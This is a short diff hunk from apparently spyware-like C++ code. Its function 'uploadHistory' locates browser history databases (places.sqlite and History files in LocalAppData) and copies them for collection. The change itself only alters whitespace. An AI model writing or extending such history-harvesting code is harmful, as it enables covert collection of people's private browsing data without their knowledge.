@@ -21,7 +21,7 @@ void uploadHistory(std::string directoryName)
 			path = searchFile(winkey_g.localAppData + it->second, "places.sqlite");
 		else
 			path = winkey_g.localAppData + it->second + "\\History";
-
+			
 		if (exist_file(path))
 		{
 			std::string pathFolderNav = directoryName + "/" + it->first;
